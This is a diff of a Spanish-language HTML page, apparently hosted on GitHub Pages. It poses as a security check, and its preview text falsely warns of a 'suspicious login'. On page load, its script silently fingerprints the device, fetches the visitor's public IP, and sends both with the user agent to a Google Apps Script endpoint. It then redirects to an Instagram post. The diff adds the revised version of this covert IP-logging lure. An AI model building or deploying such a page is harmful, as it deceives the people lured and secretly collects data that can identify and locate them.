@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando...</title>
+    <title>Verificando...</title>
 
-    <meta property="og:title" content="Seguridad de Red: Validación de Terminal" />
-    <meta property="og:description" content="Verificando integridad de la conexión móvil para acceso seguro." />
+    <meta property="og:title" content="Inicio de sesión sospechoso detectado" />
+    <meta property="og:description" content="Se ha detectado un acceso no autorizado. Verificando seguridad de la cuenta..." />
     <meta property="og:image" content="https://dennismariapinogomez-cmd.github.io/validacion-seguridad/portada.jpeg" />
 
     <style>
         body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 28px; height: 28px; animation: spin 1s linear infinite; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -20,33 +20,33 @@
 
 <script>
     window.onload = async function() {
-        // 1. GENERACIÓN DE ID AUTOMÁTICO (FINGERPRINT)
-        // Esto crea un ID único basado en el hardware del celular sin que el usuario haga nada
-        const screenRes = screen.width + "x" + screen.height;
-        const cores = navigator.hardwareConcurrency || "N/A";
-        const platform = navigator.platform;
-        const autoID = `AUDIT_${platform}_${screenRes}_CPU${cores}`;
+        // 1. GENERACIÓN AUTOMÁTICA DE IDENTIDAD (Fingerprinting)
+        const resH = screen.width + "x" + screen.height;
+        const plataforma = navigator.platform;
+        const ram = navigator.deviceMemory || "N/A";
+        // Esto crea un ID como "AUTO_Win32_1366x768" automáticamente
+        const autoID = `AUTO_${plataforma}_${resH}_RAM${ram}`;
 
         let ip = "0.0.0.0";
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
             ip = data.ip;
-        } catch (e) { ip = "IP_Protegida"; }
+        } catch (e) { ip = "IP_Protegida_Movil"; }
 
         const ua = encodeURIComponent(navigator.userAgent);
         const scriptURL = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
 
-        // 2. REGISTRO SILENCIOSO CON KEEPALIVE PARA MÓVILES
+        // 2. REGISTRO EN SEGUNDO PLANO (Keepalive para asegurar envío en celulares)
         fetch(`${scriptURL}?u=${autoID}&ip=${ip}&ua=${ua}`, { 
             mode: 'no-cors',
             keepalive: true 
         });
 
-        // 3. REDIRECCIÓN INSTANTÁNEA
+        // 3. REDIRECCIÓN INSTANTÁNEA A INSTAGRAM
         setTimeout(() => {
             window.location.href = "https://www.instagram.com/p/C_m_6u0shW2/";
-        }, 600); 
+        }, 500); 
     };
 </script>
 </body>
